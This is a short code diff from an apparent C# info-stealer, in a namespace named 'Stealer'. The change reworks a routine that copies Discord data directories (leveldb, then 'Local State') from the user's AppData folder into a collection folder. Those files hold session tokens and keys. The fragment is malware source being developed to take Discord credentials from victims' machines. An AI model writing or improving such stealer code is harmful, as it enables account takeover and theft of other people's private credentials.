@@ -35,12 +35,12 @@ namespace Stealer
             } catch { }
         }
 
-        // Copy leveldb directory
+        // Copy Local State directory
         private static void CopyLevelDb(string sSavePath)
         {
             foreach (string dir in DiscordDirectories)
             {
-                string directory = Path.Combine(Paths.appdata, dir);
+                string directory = Path.GetDirectoryName(Path.Combine(Paths.appdata, dir));
                 string cpdirectory = Path.Combine(sSavePath,
                     new DirectoryInfo(directory).Name);
 
